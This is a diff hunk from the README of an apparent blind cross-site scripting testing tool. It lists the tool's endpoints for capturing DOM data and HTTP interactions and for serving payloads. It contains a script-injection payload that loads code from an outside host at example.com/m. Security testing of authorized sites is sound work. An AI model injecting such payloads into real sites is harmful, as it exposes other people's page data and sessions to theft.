@@ -105,10 +105,11 @@ Once the application is funcitonal, you would just identify sites you are author
 "><script src="https://example.com/m"></script>
 ````
 
-The application has three core functions
+The application has HTTP queries to utilize:
 
 * POST - /m (captures DOM information)  
 * GET - /m (Loads the payload)
+* GET - /mH (captures HTTP interactions)
 * Payloads - /payloads (Gives payloads you can use for testing blind xss)
 * Everything else - Loads alert(1)
 
